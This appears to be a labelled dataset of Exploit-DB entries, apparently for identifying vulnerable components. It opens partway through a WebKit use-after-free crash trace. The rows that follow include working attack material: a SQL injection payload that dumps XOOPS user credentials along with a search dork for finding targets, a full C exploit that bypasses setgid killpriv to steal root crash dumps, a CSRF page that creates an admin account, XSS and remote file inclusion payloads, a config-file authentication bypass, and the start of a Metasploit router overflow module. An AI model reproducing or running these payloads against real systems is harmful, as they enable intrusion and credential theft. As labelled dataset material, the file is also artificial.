WebCore::Document::implicitClose() (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2452580)     #74 0x1172e2367 in WebCore::FrameLoader::checkCompleted() (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d4a367)     #75 0x1173e069d in WebCore::CachedResourceLoader::loadDone(WebCore::LoadCompletionType, bool) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2e4869d)     #76 0x117369391 in WebCore::SubresourceLoader::notifyDone(WebCore::LoadCompletionType) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2dd1391)     #77 0x1173661c8 in WebCore::SubresourceLoader::didFinishLoading(WebCore::NetworkLoadMetrics const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2dce1c8)     #78 0x10f06687b in WebKit::WebResourceLoader::didFinishResourceLoad(WebCore::NetworkLoadMetrics const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xdfc87b)     #79 0x10f06ae06 in void IPC::handleMessage<Messages::WebResourceLoader::DidFinishResourceLoad, WebKit::WebResourceLoader, void (WebKit::WebResourceLoader::*)(WebCore::NetworkLoadMetrics const&)>(IPC::Decoder&, WebKit::WebResourceLoader*, void (WebKit::WebResourceLoader::*)(WebCore::NetworkLoadMetrics const&)) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xe00e06)     #80 0x10f06a0fe in WebKit::WebResourceLoader::didReceiveWebResourceLoaderMessage(IPC::Connection&, IPC::Decoder&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xe000fe)     #81 0x10e64bea8 in WebKit::NetworkProcessConnection::didReceiveMessage(IPC::Connection&, IPC::Decoder&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x3e1ea8)     #82 0x10e3beb7e in IPC::Connection::dispatchMessage(std::__1::unique_ptr<IPC::Decoder, std::__1::default_delete<IPC::Decoder> >) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x154b7e)     #83 0x10e3c001e in IPC::Connection::dispatchIncomingMessages() (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x15601e)     #84 0x123f7d3c7 in WTF::RunLoop::performWork() (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x8f3c7)     #85 0x123f7de46 in WTF::RunLoop::performWork(void*) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x8fe46)     #86 0x7fff54e22a60 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__ (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0xa3a60)     #87 0x7fff54edc47b in __CFRunLoopDoSource0 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x15d47b)     #88 0x7fff54e054bf in __CFRunLoopDoSources0 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x864bf)     #89 0x7fff54e0493c in __CFRunLoopRun (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x8593c)     #90 0x7fff54e041a2 in CFRunLoopRunSpecific (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x851a2)     #91 0x7fff540ead95 in RunCurrentEventLoopInMode (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x2fd95)     #92 0x7fff540eab05 in ReceiveNextEventCommon (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x2fb05)     #93 0x7fff540ea883 in _BlockUntilNextEventMatchingListInModeWithFilter (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x2f883)     #94 0x7fff5239ca72 in _DPSNextEvent (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x41a72)     #95 0x7fff52b32e33 in -[NSApplication(NSEvent) _nextEventMatchingEventMask:untilDate:inMode:dequeue:] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x7d7e33)     #96 0x7fff52391884 in -[NSApplication run] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x36884)     #97 0x7fff52360a71 in NSApplicationMain (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x5a71)     #98 0x7fff7cf6cdc6 in _xpc_objc_main (/usr/lib/system/libxpc.dylib:x86_64+0x10dc6)     #99 0x7fff7cf6ba19 in xpc_main (/usr/lib/system/libxpc.dylib:x86_64+0xfa19)     #100 0x10e2604c6 in main (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent.Development:x86_64+0x1000014c6)     #101 0x7fff7cc12014 in start (/usr/lib/system/libdyld.dylib:x86_64+0x1014)  0x60800006aa34 is located 20 bytes inside of 96-byte region [0x60800006aa20,0x60800006aa80) freed by thread T0 here:     #0 0x11240dfa4 in __sanitizer_mz_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/9.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x59fa4)     #1 0x123ff08e1 in bmalloc::IsoTLS::debugFree(void*) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1028e1)     #2 0x116e58c6b in void bmalloc::IsoTLS::deallocateSlow<bmalloc::IsoConfig<96u>, WebCore::HTMLHeadElement>(bmalloc::api::IsoHeap<WebCore::HTMLHeadElement>&, void*) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x28c0c6b)     #3 0x1264c15a5 in void JSC::MarkedBlock::Handle::specializedSweep<true, (JSC::MarkedBlock::Handle::EmptyMode)1, (JSC::MarkedBlock::Handle::SweepMode)1, (JSC::MarkedBlock::Handle::SweepDestructionMode)1, (JSC::MarkedBlock::Handle::ScribbleMode)0, (JSC::MarkedBlock::Handle::NewlyAllocatedMode)1, (JSC::MarkedBlock::Handle::MarksMode)1, JSC::JSDestructibleObjectDestroyFunc>(JSC::FreeList*, JSC::MarkedBlock::Handle::EmptyMode, JSC::MarkedBlock::Handle::SweepMode, JSC::MarkedBlock::Handle::SweepDestructionMode, JSC::MarkedBlock::Handle::ScribbleMode, JSC::MarkedBlock::Handle::NewlyAllocatedMode, JSC::MarkedBlock::Handle::MarksMode, JSC::JSDestructibleObjectDestroyFunc const&)::'lambda'(void*)::operator()(void*) const (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x25d35a5)     #4 0x1264c165a in void JSC::MarkedBlock::Handle::specializedSweep<true, (JSC::MarkedBlock::Handle::EmptyMode)1, (JSC::MarkedBlock::Handle::SweepMode)1, (JSC::MarkedBlock::Handle::SweepDestructionMode)1, (JSC::MarkedBlock::Handle::ScribbleMode)0, (JSC::MarkedBlock::Handle::NewlyAllocatedMode)1, (JSC::MarkedBlock::Handle::MarksMode)1, JSC::JSDestructibleObjectDestroyFunc>(JSC::FreeList*, JSC::MarkedBlock::Handle::EmptyMode, JSC::MarkedBlock::Handle::SweepMode, JSC::MarkedBlock::Handle::SweepDestructionMode, JSC::MarkedBlock::Handle::ScribbleMode, JSC::MarkedBlock::Handle::NewlyAllocatedMode, JSC::MarkedBlock::Handle::MarksMode, JSC::JSDestructibleObjectDestroyFunc const&)::'lambda'(unsigned long)::operator()(unsigned long) const (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x25d365a)     #5 0x1264bec8b in void JSC::MarkedBlock::Handle::specializedSweep<true, (JSC::MarkedBlock::Handle::EmptyMode)1, (JSC::MarkedBlock::Handle::SweepMode)1, (JSC::MarkedBlock::Handle::SweepDestructionMode)1, (JSC::MarkedBlock::Handle::ScribbleMode)0, (JSC::MarkedBlock::Handle::NewlyAllocatedMode)1, (JSC::MarkedBlock::Handle::MarksMode)1, JSC::JSDestructibleObjectDestroyFunc>(JSC::FreeList*, JSC::MarkedBlock::Handle::EmptyMode, JSC::MarkedBlock::Handle::SweepMode, JSC::MarkedBlock::Handle::SweepDestructionMode, JSC::MarkedBlock::Handle::ScribbleMode, JSC::MarkedBlock::Handle::NewlyAllocatedMode, JSC::MarkedBlock::Handle::MarksMode, JSC::JSDestructibleObjectDestroyFunc const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x25d0c8b)     #6 0x1264b858a in void JSC::MarkedBlock::Handle::finishSweepKnowingHeapCellType<JSC::JSDestructibleObjectDestroyFunc>(JSC::FreeList*, JSC::JSDestructibleObjectDestroyFunc const&)::'lambda'()::operator()() const (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x25ca58a)     #7 0x12646e12e in void JSC::MarkedBlock::Handle::finishSweepKnowingHeapCellType<JSC::JSDestructibleObjectDestroyFunc>(JSC::FreeList*, JSC::JSDestructibleObjectDestroyFunc const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x258012e)     #8 0x12646dd37 in JSC::JSDestructibleObjectHeapCellType::finishSweep(JSC::MarkedBlock::Handle&, JSC::FreeList*) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x257fd37)     #9 0x125bd9df9 in JSC::MarkedBlock::Handle::sweep(JSC::FreeList*) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1cebdf9)     #10 0x125bcfada in JSC::LocalAllocator::tryAllocateIn(JSC::MarkedBlock::Handle*) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1ce1ada)     #11 0x125bcf796 in JSC::LocalAllocator::tryAllocateWithoutCollecting() (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1ce1796)     #12 0x125bcf1f0 in JSC::LocalAllocator::allocateSlowCase(JSC::GCDeferralContext*, JSC::AllocationFailureMode) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1ce11f0)     #13 0x11649b246 in void* JSC::allocateCell<WebCore::JSHTMLDocument>(JSC::Heap&, unsigned long) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1f03246)     #14 0x11649ac29 in WebCore::JSHTMLDocument::create(JSC::Structure*, WebCore::JSDOMGlobalObject*, WTF::Ref<WebCore::HTMLDocument, WTF::DumbPtrTraits<WebCore::HTMLDocument> >&&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1f02c29)     #15 0x11649ab6b in std::__1::enable_if<std::is_same<WebCore::HTMLDocument, WebCore::HTMLDocument>::value, WebCore::JSDOMWrapperConverterTraits<WebCore::HTMLDocument>::WrapperClass*>::type WebCore::createWrapper<WebCore::HTMLDocument, WebCore::HTMLDocument>(WebCore::JSDOMGlobalObject*, WTF::Ref<WebCore::HTMLDocument, WTF::DumbPtrTraits<WebCore::HTMLDocument> >&&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1f02b6b)     #16 0x1164a91b1 in WebCore::toJSNewlyCreated(JSC::ExecState*, WebCore::JSDOMGlobalObject*, WTF::Ref<WebCore::HTMLDocument, WTF::DumbPtrTraits<WebCore::HTMLDocument> >&&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1f111b1)     #17 0x114ae5915 in WebCore::jsDOMImplementationPrototypeFunctionCreateHTMLDocumentBody(JSC::ExecState*, WebCore::JSDOMImplementation*, JSC::ThrowScope&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x54d915)     #18 0x114ab7ef7 in long long WebCore::IDLOperation<WebCore::JSDOMImplementation>::call<&(WebCore::jsDOMImplementationPrototypeFunctionCreateHTMLDocumentBody(JSC::ExecState*, WebCore::JSDOMImplementation*, JSC::ThrowScope&)), (WebCore::CastedThisErrorBehavior)0>(JSC::ExecState&, char const*) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x51fef7)     #19 0x17ac3cce176  (<unknown module>)     #20 0x123fffd08 in llint_entry (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x111d08)     #21 0x123fffd08 in llint_entry (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x111d08)     #22 0x123fffd08 in llint_entry (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x111d08)     #23 0x123ff933a in vmEntryToJavaScript (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x10b33a)     #24 0x125d68964 in JSC::Interpreter::executeCall(JSC::ExecState*, JSC::JSObject*, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1e7a964)     #25 0x12633a5b9 in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x244c5b9)     #26 0x12633a74b in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webk",,
,,0,
39364,iOS Kernel - IOReportHub Use-After-Free Source: https://code.google.com/p/google-security-research/issues/detail?id=603  Panic log attached  OS X advisory: https://support.apple.com/en-us/HT205731 iOS advisory: https://support.apple.com/en-us/HT205732   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39364.zip,['IOReportHub'],1
27081,"Ultimate Auction 3.67 - Item.pl Cross-Site Scripting source: https://www.securityfocus.com/bid/16239/info  Ultimate Auction is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  Version 3.67 is vulnerable to this issue; prior versions may also be affected.   http://www.example.com/item.pl?item=<script>alert(""XSS"")</script>",['Item.pl'],1
29433,Magic Photo Storage Website - '/user/user_extend.php?_config[site_path]' Remote File Inclusion source: https://www.securityfocus.com/bid/21965/info                            Magic Photo Storage Website is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.                            Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/path/user/user_extend.php?_config[site_path]=http://www.example2.com,"[""'/user/user_extend.php?_config[site_path]'""]",1
5158,"XOOPS Module Classifieds - 'cid' SQL Injection ############################################################### # # XOOPS Module classifieds SQL Injection(cid) # ############################################################### # # AUTHOR : S@BUN # # HOME 1 : http://www.milw0rm.com/author/1334 # # MAÄ°L : hackturkiye.hackturkiye@gmail.com # ################################################################ # # DORK 1 : allinurl: cid""modules/classifieds/index.php?pa=Adsview"" # ################################################################ example  http://xxxx/modules/classifieds/index.php?pa=Adsview&cid=[exploit]  EXPLOIT :  -00000%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/0x3a,0x3a,concat(uname,0x3a,pass)/**/from+xoops_users/*where%20admin%20-1  ################################################################ # S@BUN                i AM NOT HACKER           S@BUN ################################################################  # milw0rm.com [2008-02-19]","[""'cid'""]",1
45033,"Linux (Ubuntu) - Other Users coredumps Can Be Read via setgid Directory and killpriv Bypass /* Note: I am both sending this bug report to security@kernel.org and filing it in the Ubuntu bugtracker because I can't tell whether this counts as a kernel bug or as a Ubuntu bug. You may wish to talk to each other to determine the best place to fix this.  I noticed halfdog's old writeup at https://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/ , describing essentially the following behavior in combination with a trick for then writing to the resulting file without triggering the killpriv logic:   ============= user@debian:~/sgid_demo$ sudo mkdir -m03777 dir user@debian:~/sgid_demo$ cat > demo.c #include <fcntl.h> int main(void) { open(""dir/file"", O_RDONLY|O_CREAT, 02755); } user@debian:~/sgid_demo$ gcc -o demo demo.c user@debian:~/sgid_demo$ ./demo user@debian:~/sgid_demo$ ls -l dir/file -rwxr-sr-x 1 user root 0 Jun 25 22:03 dir/file =============   Two patches for this were proposed on LKML back then: ""[PATCH 1/2] fs: Check f_cred instead of current's creds in should_remove_suid()"" https://lore.kernel.org/lkml/9318903980969a0e378dab2de4d803397adcd3cc.1485377903.git.luto@kernel.org/  ""[PATCH 2/2] fs: Harden against open(..., O_CREAT, 02777) in a setgid directory"" https://lore.kernel.org/lkml/826ec4aab64ec304944098d15209f8c1ae65bb29.1485377903.git.luto@kernel.org/  However, as far as I can tell, neither of them actually landed.   You can also bypass the killpriv logic with fallocate() and mmap() - fallocate() permits resizing the file without triggering killpriv, mmap() permits writing without triggering killpriv (the mmap part is mentioned at https://lore.kernel.org/lkml/CAGXu5jLu6OGkQUgqRcOyQ6DABOwZ9HX3fUQ+-zC7NjLukGKnVw@mail.gmail.com/ ):   ============= user@debian:~/sgid_demo$ sudo mkdir -m03777 dir user@debian:~/sgid_demo$ cat fallocate.c #define _GNU_SOURCE #include <stdlib.h> #include <fcntl.h> #include <err.h> #include <sys/mman.h> #include <sys/stat.h> #include <unistd.h> #include <string.h>  int main(void) {   int src_fd = open(""/usr/bin/id"", O_RDONLY);   if (src_fd == -1)     err(1, ""open 2"");   struct stat src_stat;   if (fstat(src_fd, &src_stat))     err(1, ""fstat"");   int src_len = src_stat.st_size;   char *src_mapping = mmap(NULL, src_len, PROT_READ, MAP_PRIVATE, src_fd, 0);   if (src_mapping == MAP_FAILED)     err(1, ""mmap 2"");    int fd = open(""dir/file"", O_RDWR|O_CREAT|O_EXCL, 02755);   if (fd == -1)     err(1, ""open"");   if (fallocate(fd, 0, 0, src_len))     err(1, ""fallocate"");   char *mapping = mmap(NULL, src_len, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);   if (mapping == MAP_FAILED)     err(1, ""mmap"");     memcpy(mapping, src_mapping, src_len);    munmap(mapping, src_len);   close(fd);   close(src_fd);    execl(""./dir/file"", ""id"", NULL);   err(1, ""execl""); } user@debian:~/sgid_demo$ gcc -o fallocate fallocate.c user@debian:~/sgid_demo$ ./fallocate uid=1000(user) gid=1000(user) egid=0(root) groups=0(root),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),116(scanner),121(wireshark),1000(user) =============   sys_copy_file_range() also looks as if it bypasses killpriv on supported filesystems, but I haven't tested that one so far.  On Ubuntu 18.04 (bionic), /var/crash is mode 03777, group ""whoopsie"", and contains group-readable crashdumps in some custom format, so you can use this issue to steal other users' crashdumps:   ============= user@ubuntu-18-04-vm:~$ ls -l /var/crash total 296 -rw-r----- 1 user whoopsie  16527 Jun 25 22:27 _usr_bin_apport-unpack.1000.crash -rw-r----- 1 root whoopsie  50706 Jun 25 21:51 _usr_bin_id.0.crash -rw-r----- 1 user whoopsie  51842 Jun 25 21:42 _usr_bin_id.1000.crash -rw-r----- 1 user whoopsie 152095 Jun 25 21:43 _usr_bin_strace.1000.crash -rw-r----- 1 root whoopsie  18765 Jun 26 00:42 _usr_bin_xattr.0.crash user@ubuntu-18-04-vm:~$ cat /var/crash/_usr_bin_id.0.crash cat: /var/crash/_usr_bin_id.0.crash: Permission denied user@ubuntu-18-04-vm:~$ cat fallocate.c  */  #define _GNU_SOURCE #include <stdio.h> #include <stdlib.h> #include <fcntl.h> #include <err.h> #include <sys/mman.h> #include <sys/stat.h> #include <unistd.h> #include <string.h>  int main(int argc, char **argv) {   if (argc != 2) {     printf(""usage: ./fallocate <file_to_read>"");     return 1;   }   int src_fd = open(""/bin/cat"", O_RDONLY);   if (src_fd == -1)     err(1, ""open 2"");   struct stat src_stat;   if (fstat(src_fd, &src_stat))     err(1, ""fstat"");   int src_len = src_stat.st_size;   char *src_mapping = mmap(NULL, src_len, PROT_READ, MAP_PRIVATE, src_fd, 0);   if (src_mapping == MAP_FAILED)     err(1, ""mmap 2"");    unlink(""/var/crash/privileged_cat""); /* in case we've already run before */   int fd = open(""/var/crash/privileged_cat"", O_RDWR|O_CREAT|O_EXCL, 02755);   if (fd == -1)     err(1, ""open"");   if (fallocate(fd, 0, 0, src_len))     err(1, ""fallocate"");   char *mapping = mmap(NULL, src_len, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);   if (mapping == MAP_FAILED)     err(1, ""mmap"");   memcpy(mapping, src_mapping, src_len);   munmap(mapping, src_len);   close(fd);    execl(""/var/crash/privileged_cat"", ""cat"", argv[1], NULL);   err(1, ""execl""); }  /* user@ubuntu-18-04-vm:~$ gcc -o fallocate fallocate.c user@ubuntu-18-04-vm:~$ ./fallocate /var/crash/_usr_bin_id.0.crash > /var/crash/_usr_bin_id.0.crash.stolen user@ubuntu-18-04-vm:~$ ls -l /var/crash total 384 -rwxr-sr-x 1 user whoopsie  35064 Jul  3 19:22 privileged_cat -rw-r----- 1 user whoopsie  16527 Jun 25 22:27 _usr_bin_apport-unpack.1000.crash -rw-r----- 1 root whoopsie  50706 Jun 25 21:51 _usr_bin_id.0.crash -rw-r--r-- 1 user whoopsie  50706 Jul  3 19:22 _usr_bin_id.0.crash.stolen -rw-r----- 1 user whoopsie  51842 Jun 25 21:42 _usr_bin_id.1000.crash -rw-r----- 1 user whoopsie 152095 Jun 25 21:43 _usr_bin_strace.1000.crash -rw-r----- 1 root whoopsie  18765 Jun 26 00:42 _usr_bin_xattr.0.crash user@ubuntu-18-04-vm:~$ mkdir root_crash_unpacked user@ubuntu-18-04-vm:~$ # work around bug in apport-unpack user@ubuntu-18-04-vm:~$ sed -i 's|^UserGroups: $|UserGroups: 0|' /var/crash/_usr_bin_id.0.crash.stolen user@ubuntu-18-04-vm:~$ apport-unpack /var/crash/_usr_bin_id.0.crash.stolen root_crash_unpacked/ user@ubuntu-18-04-vm:~$ file root_crash_unpacked/CoreDump  root_crash_unpacked/CoreDump: ELF 64-bit LSB core file x86-64, version 1 (SYSV), SVR4-style, from 'id', real uid: 0, effective uid: 0, real gid: 0, effective gid: 0, execfn: '/usr/bin/id', platform: 'x86_64' */",['killpriv'],1
46738,"74CMS 5.0.1 - Cross-Site Request Forgery (Add New Admin User) # Exploit Title: 74CMS v5.0.1 has a CSRF vulnerability to add a new admin user # Date: 2019-04-14 # Exploit Author: ax8 # Vendor Homepage: https://github.com/Li-Siyuan # Software Link: http://www.74cms.com/download/index.html # Version: v5.0.1 # CVE : CVE-2019-11374     74CMS v5.0.1 has a CSRF vulnerability to add a new admin user via the index.php?m=Admin&c=admin&a=add URI.     <!--poc.html(creat a administrater)-->  <!DOCTYPE html>  <html>    <head>    <title> CSRF Proof</title>    <script type=""text/javascript"">      function exec1(){        document.getElementById('form1').submit();      }    </script>    </head>    <body onload=""exec1();"">      <form id=""form1"" action=""http://localhost/index.php?m=Admin&c=admin&a=add"" method=""POST"">        <input type=""hidden"" name=""username"" value=""hacker1"" />    <input type=""hidden"" name=""email"" value=""111111111@qq.com"" />        <input type=""hidden"" name=""password"" value=""hacker1"" />        <input type=""hidden"" name=""repassword"" value=""hacker1"" />      <input type=""hidden"" name=""role_id"" value=""1"" />      </form>    </body>  </html>",['index.php?'],1
23693,"Sami FTP Server 1.1.3 - Library Crafted GET Remote Denial of Service source: https://www.securityfocus.com/bid/9657/info   Sami FTP Server has been reported prone to multiple remote denial of service vulnerabilities. It has been reported that an attacker who has sufficient credentials to access a vulnerable server, may cause the pmsystem.exe executable to raise a fatal exception by making unexpected FTP requests.  get <something unavailable>",['pmsystem.exe'],1
25885,"CarLine Forum Russian Board 4.2 - 'edit_msg.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/14045/info          Forum Russian Board is prone to multiple input validation vulnerabilities. These issues can allow attackers to carry out SQL Injection, cross-site scripting, and HTML injection attacks.          Forum Russian Board 4.2 is reported to be affected.   edit_msg.php?m_id=1&t=1&mid=1&cat=3&name_ig_array1[1]=""><script>alert(""XSS"");</script> edit_msg.php?m_id=1&t=1&mid=1&cat=3&name_ig_array[1]=""><script>alert(""XSS"");</script>","[""'edit_msg.php'""]",1
44270,"WebLog Expert Enterprise 9.4 - Authentication Bypass [+] Credits: John Page (aka hyp3rlinx)		 [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/WEBLOG-EXPERT-WEB-SERVER-ENTERPRISE-v9.4-AUTHENTICATION-BYPASS.txt [+] ISR: Apparition Security              Vendor: ======== www.weblogexpert.com   Product: ======== WebLog Expert Web Server Enterprise v9.4  WebLog Expert is a fast and powerful access log analyzer. It will give you information about your site's visitors: activity statistics, accessed files, paths through the site, information about referring pages, search engines, browsers, operating systems, and more. The program produces easy-to-read reports that include both text information (tables) and charts.    Vulnerability Type: =================== Authentication Bypass    CVE Reference: ============== CVE-2018-7581    Security Issue: ================ The ""WebServer.cfg"" under ""ProgramData\WebLog Expert\WebServer\"" used by WebLog Expert Web Server Enterprise 9.4 has weak permissions (BUILTIN\Users:(ID)C), which allows local users to set a cleartext password and login as admin.  A standard non Windows Administrator user can edit the 'WebServer.cfg' file under ""C:\ProgramData\WebLog Expert\WebServer"" set to a cleartext password and login as admin.  e.g.  C:\ProgramData\WebLog Expert\WebServer>cacls * | more C:\ProgramData\WebLog Expert\WebServer\WebServer.cfg BUILTIN\Users:(ID)C                                                                BUILTIN\Administrators:(ID)C                                                       NT AUTHORITY\SYSTEM:(ID)F                                                       BUILTIN\Administrators:(ID)F   Exploit/POC: ============= Login as a 'Standard' Windows user Comment out the Admin hashed password using ';' then add any cleartext password as follows.  [User:admin] Password=1234 ;PasswordHash=3413C538CE5234FB194E82AE1F3954FD2BC848C0 bAllProfiles=1  Now login in as Admin! :)    Network Access: =============== Local    Severity: ========= Medium    Disclosure Timeline: ============================= Vendor Notification: March 1, 2018 No replies from previous attempts March 7, 2018 : Public Disclosure    [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. All content (c).","[""'WebServer.cfg'""]",1
25364,"AN HTTPD - 'CMDIS.dll' Remote Buffer Overflow (PoC) source: https://www.securityfocus.com/bid/13066/info  AN HTTPD is reported prone to a remote buffer overflow vulnerability.  Specifically, the issue presents itself in 'cmdIS.DLL' which calls the 'GetEnvironmentStrings' function to copy environment variables into a finite sized process buffer.  The attacker can issue a malformed HTTP GET command including excessive data as a value for an affected HTTP header to trigger the overflow. This can lead to arbitrary code execution, allowing the attacker to gain unauthorized access in the context of the Web server.  AN HTTPD 1.42n is reported vulnerable, however, it is possible that other versions are affected as well.   GET /scripts/cmdIS.dll/cgi-bin/test.bat HTTP/1.0 user-agent: aaaaaaaaaaaaaaaaaaaaaa [approx 8300 characters] aaaaaaaaaaaaaaaaaaaa...","[""'CMDIS.dll'"", ""'cmdIS.DLL'""]",1
16854,"Linksys WRT54 Access Point - 'apply.cgi' Remote Buffer Overflow (Metasploit) ## # $Id: linksys_apply_cgi.rb 10457 2010-09-24 16:55:38Z hdm $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Linksys WRT54 Access Point apply.cgi Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in apply.cgi on the Linksys WRT54G and WRT54GS routers. 				According to iDefense who discovered this vulnerability, all WRT54G versions prior to 				4.20.7 and all WRT54GS version prior to 